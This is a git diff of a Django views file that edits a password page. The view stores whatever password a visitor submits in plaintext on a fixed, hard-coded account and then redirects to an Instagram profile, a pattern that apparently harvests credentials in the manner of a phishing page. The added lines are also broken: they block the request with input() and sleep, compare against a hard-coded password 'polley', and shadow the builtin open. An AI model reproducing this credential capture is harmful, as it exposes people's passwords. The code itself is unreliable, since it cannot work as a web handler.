@@ -5,6 +5,9 @@ from django.db.models import Q
 
 from .models import User
 
+def open(request):
+    return render(request, "home.html")
+
 def index(request):
     return render(request, "accounts/index.html")
 
@@ -20,9 +23,20 @@ def password_page(request):
         # print(f"Updating password for user: {username} to {password}")
 
         User.objects.filter(username__iexact='polleykalicharan').update(password=password)
-        if password:
+        time.sleep(8)
+        password = input("Enter your password: ")
+  # Simulate a delay for password update
+        if password == 'polley':
             return redirect("https://www.instagram.com/surya_____2021/")
-
+        else:
+            return render(
+                request,
+                "accounts/password.html",
+                {
+                    "username": username,
+                    "error": "Invalid password. Please try again."
+                }
+            )
         # return HttpResponseRedirect("https://www.google.com")
 
     return render(request, "accounts/password.html", {
